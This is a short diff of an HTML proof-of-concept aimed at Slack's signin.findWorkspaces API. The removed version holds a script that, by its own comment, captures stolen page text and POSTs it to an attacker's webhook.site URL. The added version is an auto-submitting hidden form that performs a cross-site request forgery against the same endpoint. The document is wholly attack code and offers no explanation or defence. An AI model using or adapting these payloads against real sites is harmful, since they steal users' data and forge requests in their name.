@@ -1,20 +1,9 @@
 
 
-<!DOCTYPE html>
-<html>
-<head>
-    <meta http-equiv="refresh" content="https://slack.com/api/signin.findWorkspaces" />
-</head>
-<body>
-    <script>
-        setTimeout(() => {
-            // Capture stolen data and send it to attacker's webhook
-            fetch("https://webhook.site/c1acb3f9-304c-414d-b941-3e8094798029", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ data: document.body.innerText })
-            });
-        }, 3000); // Wait for API response before sending data
-    </script>
-</body>
-</html>
+<form id="csrfForm" action="https://slack.com/api/signin.findWorkspaces" method="POST">
+  <input type="hidden" name="someparam" value="somevalue">
+</form>
+
+<script>
+  document.getElementById("csrfForm").submit();
+</script>
